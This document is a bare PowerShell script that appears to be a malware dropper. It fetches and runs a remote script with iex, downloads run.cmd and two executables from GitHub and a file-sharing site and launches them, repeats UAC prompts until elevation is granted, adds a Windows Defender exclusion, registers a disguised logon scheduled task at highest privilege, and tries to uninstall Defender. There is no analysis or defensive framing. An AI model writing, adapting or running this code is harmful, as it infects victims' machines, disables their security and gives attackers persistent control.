iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)

$dir = "$env:userprofile\150F4013"
New-Item -ItemType Directory -Path $dir


$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"


if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
}



Add-MpPreference -ExclusionPath $dir


schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$temp\run.cmd" /RL HIGHEST /F







Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}


if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
    Write-Host "This is a server. Exiting..."
    exit
} else {
    Invoke-WebRequest -Uri "https://anonsharing.com/file/7009f5c5b68387ce/new.exe" -OutFile "$temp\skid.exe"
    Start-Process -FilePath "$temp\skid.exe"
}



uninstall-WindowsFeature -Name Windows-Defender

